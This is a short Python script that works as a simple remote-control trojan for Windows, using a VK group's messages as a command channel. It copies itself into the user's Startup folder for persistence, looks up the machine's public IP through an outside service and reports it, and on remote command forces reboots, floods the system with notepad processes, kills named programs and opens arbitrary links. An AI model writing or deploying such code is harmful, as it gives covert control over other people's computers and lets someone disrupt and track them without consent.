import vk_api
import random
import time
import requests
import os 
import psutil
import getpass
import shutil
import subprocess 
from time import time 
import subprocess
from vk_api.keyboard import VkKeyboard, VkKeyboardColor
import webbrowser


i = 0

total_notepads = []

token = "" #set your vk-group token
vk = vk_api.VkApi(token=token)
vk._auth_token()




def lagging(secnd):
	start = time()
	while True:
		total_notepads.append(subprocess.Popen('notepad.exe'))
		if (time()- start) > secnd:
			for notepad in total_notepads:
				notepad.terminate()
			break 

def remove_to_autostart():
	try:
		user_name = getpass.getuser()
		name_file = os.path.basename(__file__)
		name_file = name_file.replace("py","exe") 
		dir_autostart = r'C:\Users\{}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'.format(user_name)
		shutil.move(name_file, dir_autostart)


	except:
		pass


my_ip = requests.get("https://ramziv.com/ip").text


def close_prog(subj):
	subj = (subj)
	os.system("TASKKILL /F /IM " + subj)

def open_link(link):
	webbrowser.open(link, new=2)
	
remove_to_autostart()

while True:
	try:
		messages = vk.method("messages.getConversations", {"offset": 0, "count": 20, "filter": "unanswered"})
		if messages["count"] >= 1:
			id = messages["items"][0]["last_message"]["from_id"]
			body = messages["items"][0]["last_message"]["text"]
			body = body.lower()
			body = body.split()
			if body[0] == "ip":
				vk.method("messages.send",{"peer_id": id, "message": "ip: " + my_ip, "random_id": random.randint(1, 2147483647)})
			elif body[0] == "reboot":
				vk.method("messages.send", {"peer_id": id, "message": ".", "random_id": random.randint(1, 2147483647)})
				os.system("shutdown /r /t 1")
			elif body[0] == "stress":
				vk.method("messages.send", {"peer_id": id, "message": ".", "random_id": random.randint(1, 2147483647)})
				secnd = int(body[1])
				lagging(secnd)
			elif body[0] == "close":
				vk.method("messages.send", {"peer_id": id, "message": ".", "random_id": random.randint(1, 2147483647)})
				subj = body[1]
				close_prog(subj)
			elif body[0] == "open":
				vk.method("messages.send", {"peer_id": id, "message": ".", "random_id": random.randint(1, 2147483647)})
				link = body[1]
				open_link(link)
			elif body[0] == "help":
				vk.method("messages.send", {"peer_id": id, "message": "перезагрузка - перезагрузка \nнагрузка + число(секунд)  \nзакрыть + название проги \nоткрыть + ссылка на сайт" , "random_id": random.randint(1, 2147483647)})




			else:
				pass
	except Exception as E:
		continue




